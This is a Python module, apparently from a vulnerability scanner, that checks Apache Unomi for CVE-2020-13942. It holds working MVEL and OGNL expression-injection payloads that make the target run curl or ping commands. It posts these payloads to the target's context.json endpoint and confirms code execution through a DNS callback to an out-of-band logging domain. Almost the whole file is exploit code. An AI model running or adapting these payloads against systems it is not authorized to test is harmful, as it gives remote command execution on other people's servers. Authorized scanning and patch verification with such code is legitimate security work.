#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

payload_mvel = '''{"filters": [{"id": "sample","filters": [{"condition": { "parameterValues": {"": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"COMMANDDNSDOMAIN\\");"},"type": "profilePropertyCondition"}}]}],"sessionId": "sample"}'''

payload_ognl = '''{"personalizations":[{"id":"gender-test","strategy":"matching-first","strategyOptions":{"fallback":"var2"},"contents":[{"filters":[{"condition":{"parameterValues":{"propertyName":"(#runtimeclass = #this.getClass().forName(\\"java.lang.Runtime\\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\\"getRuntime\\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\\"exec\\")}.{? #this.getParameters()[0].getType().getName().equals(\\"java.lang.String\\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\\"COMMANDDNSDOMAIN\\"))","comparisonOperator":"equals","propertyValue":"male"},"type":"profilePropertyCondition"}}]}]}],"sessionId":"sample"}'''

cve_2020_13942_payloads = [
    # ! MVEL表达式
    {
        'path': 'context.json',
        'data': payload_mvel.replace('COMMAND', 'curl ')
    },
    {
        'path': 'context.json',
        'data': payload_mvel.replace('COMMAND', 'curl http://')
    },
    {
        'path': 'context.json',
        'data': payload_mvel.replace('COMMAND', 'ping -c 4 ')
    },
    {
        'path': 'context.json',
        'data': payload_mvel.replace('COMMAND', 'ping ')
    },
    # ! OGNL表达式
    {
        'path': 'context.json',
        'data': payload_ognl.replace('COMMAND', 'curl ')
    },
    {
        'path': 'context.json',
        'data': payload_ognl.replace('COMMAND', 'curl http://')
    },
    {
        'path': 'context.json',
        'data': payload_ognl.replace('COMMAND', 'ping -c 4 ')
    },
    {
        'path': 'context.json',
        'data': payload_ognl.replace('COMMAND', 'ping ')
    },
]

def cve_2020_13942_scan(clients):
    ''' 在Apache Unomi 1.5.1级以前版本中, 
        存在一处表达式注入漏洞, 远程攻击者通过MVEL和OGNL表达式即可在目标服务器上执行任意命令
    '''
    client = clients.get('reqClient')
    sessid = '69e506227812d37756fdf19a444de2b5'
    
    vul_info = {
        'app_name': 'ApacheUnomi',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2020-13942',
    }

    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cve_2020_13942_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
